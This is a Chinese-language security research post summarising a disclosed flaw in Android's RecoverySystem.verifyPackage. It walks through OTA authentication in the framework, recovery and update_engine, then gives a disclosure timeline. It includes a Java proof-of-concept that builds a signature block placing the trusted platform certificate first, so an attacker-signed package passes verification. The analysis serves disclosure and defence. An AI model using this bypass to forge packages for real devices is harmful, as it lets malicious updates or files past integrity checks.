#  AOSP OTA签名验证漏洞——如何绕过Android系统更新包的安全检查？   
原创 Tianu Laqian  山石网科安全技术研究院   2025-05-06 03:32  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
**一个隐藏在Android系统更新包签名验证中的小漏洞，竟然可以让恶意软件包通过安全检查！**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
在当今数字化时代，Android设备的安全性一直是用户和开发者关注的焦点。系统更新作为保障设备安全的重要手段，其完整性验证机制更是至关重要。然而，最近Quarkslab的研究人员发现了一个存在于AOSP（Android Open Source Project）OTA（Over-The-Air）更新包签名验证中的漏洞[1]，这个漏洞可能会让恶意软件包绕过系统的安全检查，从而对用户的设备安全构成威胁。今天，我们就来深入探讨一下这个漏洞的细节，以及它对Android设备安全性的潜在影响。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、引言**  
  
  
本文我们将跟随作者的脚步，一起来探讨Android系统中OTA包的身份验证机制。由于更新流程较为复杂，本文并不会深入所有细节，而是重点理解关键系统组件及其身份验证环节的位置。  
  
  
首先，更新客户端需要下载更新包，这类包可能是旧版格式或AB格式（利用AB分区机制）。AB包可能支持流式传输或非流式传输，但身份验证方式相同。无论哪种情况，更新客户端下载的包都是带有签名块的ZIP归档文件，签名块存储在注释区。OTA客户端在首次解压并解析元数据前，必须通过  
RecoverySystem.verifyPackage  
对包进行身份验证。  
  
  
若OTA是旧版的非AB格式包（且设备支持该格式），客户端可直接调用  
RecoverySystem.installPackage  
，通过Bootloader控制块（BCB）中的参数将其移交至恢复模式并重启。若OTA是AB格式包（且设备支持该格式），客户端需通过对应的 Android 接口定义语言（AIDL）文件定义的API与  
update_engine  
服务交互：首先为更新分配空间（  
IUpdateEngine.allocateSpaceForPayload  
），然后将更新应用至可用AB分区（  
IUpdateEngine.applyPayload  
）。  
  
  
在使用Google Play服务的设备上，  
GmsCore  
是遵循此流程的客户端之一。各OEM厂商的固件都需要对此流程进行定制化实现。  
  
  
如需完整细节，建议查阅  
Android 官方文档  
[2]。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、VerifyPackage函数分析**  
  
  
android.os.RecoverySystem.verifyPackage  
 函数的用途是验证ZIP归档的完整性，其设计初衷是在将更新包移交至恢复模式或  
update_engine  
（后续会再次验证）之前进行初步校验。  
  
  
该函数通过以下步骤验证：检查ZIP归档的注释区是否包含一个DER编码的签名块；确保归档内容（排除注释区）与签名块中的摘要匹配；验证签名证书是否为平台信任的证书。问题在于，函数仅验证签名块中是否包含证书，但未检查该证书是否为实际用于签名的证书。攻击者可利用此缺陷构造通过验证的签名块，而无需持有受信证书的私钥。  
  
  
在以下第一个代码段中，签名块通过  
sun.security.pkcs.PKCS7  
解析，  
signatureKey  
取自签名块的第一个证书（  
certificates[0]  
）。随后，该公钥与受信证书的公钥进行比对，若无匹配则抛出异常。  
  
```
// 解析签名PKCS7 block =    new PKCS7(new ByteArrayInputStream(eocd, commentSize+22-signatureStart, signatureStart));// 提取签名块中的第一个证书（假设包中仅包含一个证书）X509Certificate[] certificates = block.getCertificates();if (certificates == null || certificates.length == 0) {    throw new SignatureException("signature contains no certificates");}X509Certificate cert = certificates[0];PublicKey signatureKey = cert.getPublicKey();SignerInfo[] signerInfos = block.getSignerInfos();if (signerInfos == null || signerInfos.length == 0) {    throw new SignatureException("signature contains no signedData");}SignerInfo signerInfo = signerInfos[0];// 检查证书公钥是否匹配任意一个受信公钥boolean verified = false;HashSet<X509Certificate> trusted = getTrustedCerts(    deviceCertsZipFile == null ? DEFAULT_KEYSTORE : deviceCertsZipFile);for (X509Certificate c : trusted) {    if (c.getPublicKey().equals(signatureKey)) {        verified = true;        break;    }}if (!verified) {    throw new SignatureException("signature doesn't match any trusted key");}
```  
  
  
然而，我们将会看到，代码中“包中应仅含一个证书”的假设是错误的，实际签名证书不一定是第一个证书。这里，函数调用  
block.verify  
，实现签名和完整性检查。  
  
```
SignerInfo verifyResult = block.verify(signerInfo, new InputStream() {    // 签名覆盖除归档注释及2字节长度外的所有内容    long toRead = fileLen - commentSize - 2;    long soFar = 0;    int lastPercent = 0;    long lastPublishTime = startTimeMillis;    @Override    public int read() throws IOException {        throw new UnsupportedOperationException();    }    @Override    public int read(byte[] b, int off, int len) throws IOException {        if (soFar >= toRead) {            return -1;        }        if (Thread.currentThread().isInterrupted()) {            return -1;        }        int size = len;        if (soFar + size > toRead) {            size = (int)(toRead - soFar);        }        int read = raf.read(b, off, size);        soFar += read;        if (listenerForInner != null) {            long now = System.currentTimeMillis();            int p = (int)(soFar * 100 / toRead);            if (p > lastPercent &&                now - lastPublishTime > PUBLISH_PROGRESS_INTERVAL_MS) {                lastPercent = p;                lastPublishTime = now;                listenerForInner.onProgress(lastPercent);            }        }        return read;    }});
```  
  
  
libcore中SignerInfoverify  
函数的实现通过  
getCertificate  
方法，利用序列号和颁发者信息从证书区块中恢复签名证书。  
getCertificate  
会遍历区块中包含的证书以找到正确的证书，这意味着只要存在有效证书，无论其处于区块中的任何位置都能验证成功。  
  
```
X509Certificate cert = getCertificate(block);PublicKey key = cert.getPublicKey();if (cert == null) {    return null;}
```  
  
  
```
Signature sig = Signature.getInstance(algname);sig.initVerify(key);
```  
  
  
```
public X509Certificate getCertificate(PKCS7 block)    throws IOException{    return block.getCertificate(certificateSerialNumber, issuerName);}
```  
  
  
```
public X509Certificate getCertificate(BigInteger serial, X500Name issuerName) {    if (certificates != null) {        if (certIssuerNames == null)            populateCertIssuerNames();        for (int i = 0; i < certificates.length; i++) {            X509Certificate cert = certificates[i];            BigInteger thisSerial = cert.getSerialNumber();            if (serial.equals(thisSerial)                && issuerName.equals(certIssuerNames[i]))            {                return cert;            }        }    }    return null;}
```  
  
  
最后需要说明的是，证书区块中的证书部分本质上是一个ASN.1的SET OF结构，该结构可以包含多个证书对象。libcore的解析器既没有限制这种多证书包含的机制，也未对证书设置任何约束条件（例如要求必须是证书链的组成部分）。  
  
  
以下是使用相同实现生成签名包的代码示例。在对证书区块进行编码时，证书会在SET OF结构中按特定规则排序，其中编码后证书的第一个区分字段是其内容长度。因此，要确保签名证书位于第二位（使预期/平台证书排在首位），只需创建一个具有超大主题字段的证书即可。  
  
```
public staticbyte[] sign(byte[] data) {    if (data == null) {        data = Base64.getDecoder().decode(ZIP_DATA);    }    try {        Class<?> pkcs7Class = Sign.class.getClassLoader().loadClass("sun.security.pkcs.PKCS7");        Class<?> contentInfoClass = Sign.class.getClassLoader().loadClass("sun.security.pkcs.ContentInfo");        Class<?> objIdClass = Sign.class.getClassLoader().loadClass("sun.security.util.ObjectIdentifier");        Class<?> derValClass = Sign.class.getClassLoader().loadClass("sun.security.util.DerValue");        Class<?> signerInfoClass = Sign.class.getClassLoader().loadClass("sun.security.pkcs.SignerInfo");        Class<?> algIdClass = Sign.class.getClassLoader().loadClass("sun.security.x509.AlgorithmId");        Class<?> x500NameClass = Sign.class.getClassLoader().loadClass("sun.security.x509.X500Name");        X509Certificate platform = getCertificate(PLATFORM_CERT);        X509Certificate signing = getCertificate(SIGNING_CERT);        PrivateKey key = getPrivateKey(SIGNING_KEY);        byte[] toSign = Arrays.copyOfRange(data, 0, data.length - 2);        byte[] signature = null;        try {            Signature privateSignature = Signature.getInstance("SHA256withRSA");            privateSignature.initSign(key);            privateSignature.update(toSign);            signature = privateSignature.sign();        } catch (Exception e) {            Log.e(TAG, "exception", e);        }        Object hashAlg = algIdClass.getMethod("get", String.class).invoke(null, "SHA-256");        Object encAlg = algIdClass.getMethod("get", String.class).invoke(null, "RSA");        Object issuer = x500NameClass.getConstructor(String.class).newInstance(signing.getIssuerX500Principal().getName());        Object serial = signing.getSerialNumber();        Object signer = signerInfoClass.getConstructor(x500NameClass, BigInteger.class, algIdClass, algIdClass, byte[].class).newInstance(issuer, serial, hashAlg, encAlg, signature);        int[] sdata = {1, 2, 840, 113549, 1, 7, 2};        Object contentInfo = contentInfoClass.getConstructor(objIdClass, derValClass).newInstance(objIdClass.getMethod("newInternal", sdata.getClass()).invoke(null, sdata), null);        Object digestAlgIds = Array.newInstance(algIdClass, 1);        Array.set(digestAlgIds, 0, hashAlg);        X509Certificate[] certs = new X509Certificate[]{audit, signing};        X509CRL[] crls = new X509CRL[]{};        Object signers = Array.newInstance(signerInfoClass, 1);        Array.set(signers, 0, signer);        Object pkcs = pkcs7Class.getConstructor(digestAlgIds.getClass(), contentInfo.getClass(), certs.getClass(), crls.getClass(), signers.getClass()).newInstance(digestAlgIds, contentInfo, certs, null, signers);        ByteArrayOutputStream baos = new ByteArrayOutputStream();        pkcs7Class.getMethod("encodeSignedData", OutputStream.class).invoke(pkcs, baos);        byte[] sigBlock = baos.toByteArray();        int commentSize = sigBlock.length + 6;        int sigStart = commentSize;        ByteArrayOutputStream out = new ByteArrayOutputStream();        out.write(toSign);        out.write(newbyte[]{(byte)(commentSize & 0xff), (byte)((commentSize >> 8) & 0xff)});        out.write(sigBlock);        out.write(newbyte[]{(byte)(sigStart & 0xff), (byte)((sigStart >> 8) & 0xff), (byte) 0xff, (byte) 0xff, (byte)(commentSize & 0xff), (byte)((commentSize >> 8) & 0xff)});        byte[] bytes = out.toByteArray();        Log.e(TAG, "Block size: " + String.valueOf(sigBlock.length));        Object test = pkcs7Class.getConstructor(bytes.getClass()).newInstance(sigBlock);        certs = (X509Certificate[]) pkcs7Class.getMethod("getCertificates").invoke(test);        Log.e(TAG, "Certs match: " + String.valueOf(certs[0].equals(platform)));        return bytes;    } catch (Exception e) {        Log.e(TAG, "exception", e);    }    return null;}
```  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、恢复模式中的包认证机制**  
  
恢复模式下对软件包的认证流程与  
RecoverySystem.verifyPackage  
基本一致，因为客户端会将原始包文件直接传递给恢复系统。具体认证工作由  
verify_file  
函数完成，该函数在安装流程初始阶段被  
VerifyAndInstallPackage  
调用。此函数从归档文件末尾（位于注释区域）提取6字节的尾部数据，并利用这些数据定位中央目录结束标记（EOCD），其位置计算公式为：  
文件总长度 - (注释大小 + 22)  
。尾部数据结构为：  
签名块偏移量（2字节，小端序） || 0xff 0xff || 注释大小（2字节，小端序）  
。首先，通过比对前4字节与EOCD magic验证EOCD存在性，并确保文件中后续位置无其他EOCD magic。此验证至关重要，因为后续处理依赖  
libziparchive  
库从文件末尾逆向搜索magic定位EOCD。若缺少此检查，攻击者可能通过尾部指向伪造的EOCD记录（例如文件条目中的虚假记录），导致认证流程仅验证部分文件内容（至伪造记录处截止），从而允许向合法包中注入恶意内容。随后，计算归档文件完整内容（排除注释区域及其长度字段）的SHA-1和SHA-256哈希值。通过极简ASN.1解析器从签名块提取加密的哈希值，该解析器仅处理首个  
SignerInfo  
条目，逐字节解析数据并在每一步严格校验数据长度。最后，遍历平台预置公钥集，调用  
libssl  
的  
RSA_verify  
/  
ECDSA_verify  
接口，使用计算得到的哈希值、签名块中的加密哈希值以及可信密钥进行验证。仅当某个可信密钥能通过公钥解密并匹配哈希值时，认证方视为通过。尽管与Android框架的认证目标相同，但恢复模式的实现规避了框架中的缺陷，利用该漏洞的传统OTA升级包将在恢复模式中被拦截，无法造成实际危害。  
  
```
Simple version of PKCS#7 SignedData extraction. This extracts thesignature OCTET STRING to be used for signature verification.For full details, see http://www.ietf.org/rfc/rfc3852.txtThe PKCS#7 structure looks like:  SEQUENCE (ContentInfo)    OID (ContentType)    [0] (content)      SEQUENCE (SignedData)        INTEGER (version CMSVersion)        SET (DigestAlgorithmIdentifiers)        SEQUENCE (EncapsulatedContentInfo)        [0] (CertificateSet OPTIONAL)        [1] (RevocationInfoChoices OPTIONAL)        SET (SignerInfos)          SEQUENCE (SignerInfo)            INTEGER (CMSVersion)            SEQUENCE (SignerIdentifier)            SEQUENCE (DigestAlgorithmIdentifier)            SEQUENCE (SignatureAlgorithmIdentifier)            OCTET STRING (SignatureValue)
```  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**四、update_engine 中的身份验证**  
  
针对AB分区OTA升级包的认证在  
update_engine  
中的实现方式截然不同。升级客户端会从归档文件中提取二进制数据负载（payload），并将其传递给  
update_engine  
（若为流式升级，  
update_engine  
也可直接下载该负载）。数据负载的起始部分为签名元数据段，其后紧跟操作数据。元数据段头部包含以下字段：  
 {'C', 'r', 'A', 'U'}（4字节） || 版本号（8字节） || 清单大小（8字节） || 签名块大小（4字节）  
 随后依次为清单（manifest）和签名块。认证过程由  
DeltaPerformer::Write  
函数触发。该函数首先读取并验证头部字段（通过  
PayloadMetadata::ParsePayloadHeader  
），包括校验魔数有效性、元数据大小是否超出负载范围等。接着调用  
PayloadMetadata::ValidateMetadataSignature  
验证签名：读取签名块，对签名块起始位置前的所有元数据（含头部和清单）计算SHA-256哈希，并将哈希值与签名数据传入  
PayloadVerifier::VerifySignature  
进行验证。  
  
  
签名块本身是一个Protocol Buffer消息，其结构定义如下：  
  
```
message Signatures {  message Signature {    optional uint32 version = 1 [deprecated = true];    optional bytes data = 2;    // 针对EC密钥的DER编码签名长度因SHA-256哈希输入不同而可能变化。    // 但由于签名长度需在签名前固定（因其自身也是被签名内容的一部分），    // 此处通过填充使签名数据达到密钥支持的最大长度。验证时需根据    // |unpadded_signature_size|截断至实际有效长度。    optional fixed32 unpadded_signature_size = 3;  }  repeated Signature signatures = 1;}
```  
  
  
签名验证过程本身存在特殊设计。对于签名块中的每个签名（或至少验证至首个通过为止），若使用RSA平台公钥，系统不会直接调用  
RSA_verify  
，而是将签名数据通过候选平台公钥进行  
RSA_public_decrypt  
解密，并将解密结果与"手动"按PKCS1-v1.5填充规则生成的哈希值进行比对。此逻辑仅针对RSA平台密钥，对于EC密钥则直接使用  
ECDSA_verify  
。尽管验证方式不同，整体机制仍属合理。若签名验证成功，系统将解析清单（同为Protocol Buffer消息）并继续安装流程。该清单包含需在目标分区执行的操作列表，其中涉及数据块的操作需从负载数据段提取内容，并通过与清单中预签名的SHA-256哈希值比对进行逐项校验。  
  
  
尽管数据负载已通过完整认证流程，但  
GmsCore  
会从原始包中提取另一个名为  
care_map  
的文件（同样为Protocol Buffer消息），而该文件未经过任何认证。该文件在设备重启时由  
update_verifier  
使用，内含一系列块范围定义。  
  
  
最后需补充说明升级引擎的一个特性：当系统属性  
ro.secure  
设为  
0  
时，认证或完整性校验失败不会中断升级流程。此行为在代码中明确体现（如下所示），第三方ROM开发者或已Root设备的维护者需特别注意此机制的安全影响：  
  
```
install_plan_.hash_checks_mandatory = hardware_->IsOfficialBuild();
```  
  
  
```
  if (*error != ErrorCode::kSuccess) {    if (install_plan_->hash_checks_mandatory) {      // The autoupdate_CatchBadSignatures test checks for this string      // in log-files. Keep in sync.      LOG(ERROR) << "Mandatory metadata signature validation failed";      return MetadataParseResult::kError;    }    // For non-mandatory cases, just send a UMA stat.    LOG(WARNING) << "Ignoring metadata signature validation failures";    *error = ErrorCode::kSuccess;  }
```  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**五、结论**  
  
若未能正确认证OTA升级包，其后果可能极为严重。潜在风险包括但不限于：修改未受AVB/dm-verity保护的分区内容，或通过安装后脚本实现远程代码执行。尽管  
verifyPackage  
中的漏洞看似影响有限（假设OEM固件升级客户端实现正确），但恶意构造的升级包仍可能突破首层防线，直至被恢复模式或  
update_engine  
拦截。  
  
  
然而，部分OEM厂商及第三方应用曾使用  
verifyPackage  
认证其他类型文件（如APK包、配置文件等），此类做法至今可能仍存在。需特别指出，该函数自诞生以来很可能始终存在此漏洞，且至今未被修复。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**六、漏洞披露时间线**  
  
作者已将此漏洞报告至Google。以下为协同漏洞披露（CVD）过程中的关键事件时间线，旨在透明化流程及各方行动：  
  
- 2024年1月18日 Quarkslab通过Google漏洞追踪系统提交漏洞报告  
  
- 2024年1月19日 Google确认漏洞，要求进一步说明披露细节  
  
- 2024年1月19日 Quarkslab解释漏洞发现于客户安全评估项目（受NDA约束）  
  
- 2024年1月22日 Google要求提供可在最新Android U版本复现的最小化完整PoC  
  
- 2024年2月5日 Quarkslab向Google提交PoC  
  
- 2024年2月6日 Google确认PoC有效，表示将启动标准调查与修复流程  
  
- 2024年2月14日 Google要求补充信息  
  
- 2024年2月19日 Quarkslab发送分步骤复现指南  
  
- 2024年2月20日 Quarkslab补充设备指纹及logcat日志输出等细节  
  
- 2024年2月20日 Google确认收到数据，重申将执行标准调查与修复流程  
  
- 2024年3月8日 Quarkslab询问进展  
  
- 2024年3月8日 Google回复暂无更新  
  
- 2025年3月12日 Google评定漏洞为中危，表示中危漏洞通常在未来版本修复，关闭报告且不再提供更新  
  
- 2025年3月21日 Google将漏洞状态标记为“不予修复（不可行）”  
  
- 2025年4月8日 本文发布  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**七、相关链接**  
  
  
[1]https://blog.quarkslab.com/aosp_ota_signature_bug.html  
  
[2]https://source.android.com/docs/core/ota/sign_builds  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
现阶段，山石网科掌握30项自主研发核心技术，申请560多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及  
基础设施安全、云安全、数据安全、应用安全、安全运营、工业互联网安全、信息技术应用创新、安全服务、安全教育等九大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
